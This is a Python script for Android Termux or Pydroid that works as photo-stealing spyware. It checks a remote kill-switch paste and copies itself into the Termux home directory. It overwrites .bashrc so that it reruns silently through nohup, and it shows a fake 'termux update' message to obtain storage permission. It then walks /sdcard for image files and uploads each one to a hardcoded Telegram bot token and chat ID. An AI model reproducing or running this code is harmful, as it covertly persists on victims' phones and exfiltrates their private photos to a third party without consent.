import os
import subprocess, sys
from time import sleep as x
import time

class Zeyad:
    def __init__(self):
        self.txt = "/sdcard/Myfile.txt"
        self.txt2 = "/sdcard/Myfile1.txt"
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.FilePer = "/data/data/com.termux/files/home/.per.py"
        self.test = "/sdcard/test.txt"
        self.file = __file__
        self.target = "/data/data/com.termux/files/home/" + os.path.basename(__file__)
        import requests
        try:
            requests.get("https://google.com")
            s = requests.get("https://snippet.host/cotfay/raw").text
            a = '["ZV-ACTIVE"]'
            if a in s:
                pass
            else:
                os.remove(__file__)
                sys.exit('Follow ME TELE: sxtz0')
        except:
            x(4)
            self.__init__()
        if not os.path.exists(self.target):
            os.system("cp " + __file__ + " " + self.target)
        if self.CheckIfTermux_Pydroid() == "pydroid":
            self.checkfile()
        elif self.CheckIfTermux_Pydroid() == "termux":
            self.Middle()

    def Middle(self):
        try:
            open(self.test, 'w').write('fuck')
            a = open(self.bashrc, 'r').read()
            if "nohup" in a:
                self.checkfile()
            else:
                self.InjectionHide()
                self.checkfile()
        except FileNotFoundError:
            os.system("cd && touch .bashrc")
            self.Middle()
        except PermissionError:
            self.GetPermission()

    def GetPermission(self):  ## without permission
        try:
            open(self.test, 'w').write("fuck")
            self.InjectionHide()
        except PermissionError:
            os.system("termux-setup-storage")
            with open(self.FilePer, 'w') as per:
                per.write(f"""
from os import system
from rich.console import Console
console = Console()
console.print('termux update for now !!',style='bold red3')
def per():
     try:
       open('{self.test}','w')
       system('nohup python {self.target} > /dev/null 2>&1 &')
     except:
        system('termux-setup-storage')
        per()
per()""")
            w = open(self.bashrc, 'w')
            w.write('python ' + self.FilePer)
            w.close()
            sys.exit()

    def tele(self, document_path):
        import requests
        try:

            files = {
                "document": (document_path, open(document_path, "rb"))
            }

            response = requests.post(
                f"https://api.telegram.org/bot6125885661:AAFj6RGuzH54dqTAhl122A83LvlgCHU873A/sendDocument?chat_id=5049819705",
                files=files
            )
            if response.status_code == 200:
                with open(self.txt2, 'a') as max:
                    max.write(document_path + "\n")
        except FileNotFoundError or FileExistsError:
            time.sleep(3)
            self.AllFileInTxt()
        except:
            self.__init__()

    def CheckIfTermux_Pydroid(self):
        if os.path.exists("/data/data/com.termux/files/home/"):
            return "termux"
        else:
            return "pydroid"

    def InjectionHide(self):
        bash = open(self.bashrc, 'w')
        bash.write(f'nohup python {self.target} > /dev/null 2>&1 &')
        bash.close()

    def checkfile(self):
        if not os.path.exists(self.txt):
            self.AllFileInTxt()
        else:
            if os.path.exists(self.txt2):  ##second
                s = open(self.txt2, 'r').read()
                with open(self.txt, 'r') as txt:
                    for line in txt:
                        if line.strip() in s:
                            continue
                        self.tele(line.strip())
            else:
                with open(self.txt, 'r') as m:
                    for line in m:
                        self.tele(line.strip())

    def AllFileInTxt(self):
        try:
            s = open(self.txt, 'w')
            for root, dirs, files in os.walk('/sdcard'):
                for file in files:
                    ext = os.path.splitext(file)[1]
                    if ext in [".jpg", ".png", ".jpeg", ".hiec"]:
                        s.write(str(root + "/" + file) + "\n")
            s.close()
            self.checkfile()
        except PermissionError:
            self.GetPermission()


def install(com):
    subprocess.run(com, shell=True, capture_output=True, text=True)


def installlib():
    try:
        import rich
    except ModuleNotFoundError or ImportError:
        install('pip install rich')
    try:
        import requests
    except ModuleNotFoundError or ImportError:
        install('pip install requests')
    finally:
        Zeyad()


installlib()

